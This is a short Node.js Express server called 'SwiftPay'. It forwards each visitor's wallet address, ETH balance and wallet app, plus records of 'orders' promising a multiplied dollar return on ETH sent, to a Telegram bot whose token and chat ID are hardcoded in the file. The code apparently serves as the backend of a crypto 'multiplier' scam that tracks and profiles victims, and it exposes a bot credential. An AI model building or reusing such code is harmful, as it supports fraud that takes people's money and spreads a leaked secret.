import "dotenv/config";
import express    from "express";
import { ethers } from "ethers";
import cors       from "cors";
import rateLimit  from "express-rate-limit";
import helmet     from "helmet";

const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch (e) { console.error("Telegram error:", e.message); }
}

const app     = express();
const limiter = rateLimit({ windowMs: 60000, max: 30, standardHeaders: true, legacyHeaders: false });

app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));

app.get("/health", (req, res) => res.json({ status: "ok" }));

app.post("/api/connected", limiter, async (req, res) => {
  const { wallet, balance, chain, via } = req.body;
  if (!wallet) return res.status(400).json({ error: "Missing wallet" });

  console.log(`[CONNECT] ${wallet} | ${balance} ETH | ${chain} | ${via}`);

  await tg(
    `🔌 <b>Wallet Connected</b>\n\n` +
    `👛 Wallet: <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b>\n` +
    `🌐 Chain: ${chain || "mainnet"}\n` +
    `🦊 Via: ${via || "unknown"}\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

app.post("/api/order", limiter, async (req, res) => {
  const { senderWallet, payoutWallet, packageUsd, packageReceive, packageBonus, ethAmount, txHash, block } = req.body;
  if (!senderWallet) return res.status(400).json({ error: "Missing data" });

  console.log(`[ORDER] ${senderWallet} | $${packageUsd} | ${ethAmount} ETH`);

  await tg(
    `💰 <b>New Order!</b>\n\n` +
    `👛 Sender: <code>${senderWallet}</code>\n` +
    `📤 Payout to: <code>${payoutWallet}</code>\n` +
    `💵 Package: <b>$${Number(packageUsd).toLocaleString()} → $${Number(packageReceive).toLocaleString()}</b>\n` +
    `🚀 Bonus: ${packageBonus} multiplier\n` +
    `⛓ ETH sent: <b>${ethAmount} ETH</b>\n` +
    `🔗 <a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n` +
    `📦 Block: ${block}\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("SwiftPay backend running on port", PORT);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  await tg(`🚀 <b>SwiftPay Started</b>\n🕐 ${new Date().toUTCString()}`);
});
